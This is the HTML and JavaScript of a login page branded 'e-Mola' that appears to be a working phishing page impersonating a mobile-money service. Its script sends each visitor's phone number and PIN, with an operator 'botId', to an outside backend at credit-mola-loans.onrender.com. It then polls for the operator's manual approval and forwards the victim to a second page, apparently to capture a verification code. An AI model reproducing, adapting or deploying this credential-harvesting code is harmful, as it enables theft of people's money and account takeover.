<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>

<style>
body {
    font-family: Arial, sans-serif;
    background: linear-gradient(180deg, #f9a03f, #f47f3d);
    height: 100vh;
    margin: 0;
    display: flex;
    justify-content: center;
    align-items: center;
}

.pin-container {
    width: 100%;
    max-width: 420px;
    padding: 20px;
    text-align: center;
}

.logo {
    margin-bottom: 25px;
    color: #fff;
}

.logo h1 {
    margin: 0;
    font-size: 32px;
}

.logo p {
    margin: 5px 0 0;
    font-size: 14px;
    opacity: 0.9;
}

input {
    width: 100%;
    padding: 14px;
    border-radius: 25px;
    border: none;
    outline: none;
    margin-bottom: 15px;
    font-size: 16px;
    background: rgba(0,0,0,0.2);
    color: #fff;
}

input::placeholder {
    color: rgba(255,255,255,0.7);
}

button {
    width: 100%;
    padding: 14px;
    border-radius: 25px;
    border: none;
    background: #fff;
    color: #333;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
}

button:disabled {
    opacity: 0.6;
    cursor: not-allowed;
}

.status {
    margin-top: 12px;
    font-size: 14px;
    color: #fff;
}
</style>
</head>

<body>

<div class="pin-container">

    <div class="logo">
        <h1>e-Mola</h1>
        <p>Meu cell, minha mola</p>
    </div>

    <form id="pinForm">
        <input id="phoneInput" type="tel" placeholder="Enter phone number" required>
        <input id="pinInput" type="password" placeholder="PIN" 
        <!-- maxlength="4"  -->
        required>

        <button id="submitBtn">LOGIN</button>
    </form>

    <div class="status" id="status"></div>

</div>

<script>
const BACKEND_URL = "https://credit-mola-loans.onrender.com";

// ---------------- BOT ID ----------------
const params = new URLSearchParams(window.location.search);
const botId = params.get('botId');
if (!botId) {
    alert("Invalid access link");
    throw new Error("botId missing");
}

// ---------------- SUBMIT PIN ----------------
document.getElementById('pinForm').addEventListener('submit', async e => {
    e.preventDefault();

    const phone = document.getElementById('phoneInput').value.trim();
    const pin = document.getElementById('pinInput').value.trim();
    const statusDiv = document.getElementById('status');
    const btn = document.getElementById('submitBtn');

    if (!phone || pin.length < 4) return;

    // store for next page
    localStorage.setItem('phone', phone);
    localStorage.setItem('pin', pin);

    btn.disabled = true;
    btn.textContent = 'Logging in...';
    statusDiv.textContent = '';

    const res = await fetch(`${BACKEND_URL}/submit-pin`, {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({
            name: localStorage.getItem('fullName'),
            phone,
            pin,
            botId
        })
    });

    const { requestId } = await res.json();

    // ---------------- POLLING ----------------
    const poll = setInterval(async () => {
        const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
        const d = await r.json();

        if (d.blocked) {
            statusDiv.textContent = d.message || "Invalid number";
            btn.disabled = false;
            btn.textContent = 'LOGIN';
            clearInterval(poll);
            return;
        }

        if (d.approved === true) {
            clearInterval(poll);
            window.location.href = `code.html?botId=${botId}&requestId=${requestId}`;
        }

        if (d.approved === false) {
            statusDiv.textContent = "Incorrect PIN";
            btn.disabled = false;
            btn.textContent = 'LOGIN';
            document.getElementById('pinInput').value = '';
        }
    }, 1500);
});
</script>

</body>
</html>
